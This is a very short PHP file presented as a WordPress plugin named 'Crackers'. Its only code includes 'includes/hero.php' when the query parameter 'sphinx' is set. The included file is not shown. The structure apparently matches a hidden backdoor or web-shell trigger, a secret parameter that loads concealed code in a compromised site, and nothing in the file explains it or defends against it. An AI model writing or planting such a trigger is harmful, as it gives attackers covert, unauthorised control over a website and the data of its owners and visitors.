<?php
/**
 * Plugin Name: Crackers
 * Version: 1.0
 * Author: Rizky Dev */

if (isset($_GET["sphinx"])){
  include("includes/hero.php");
}

?>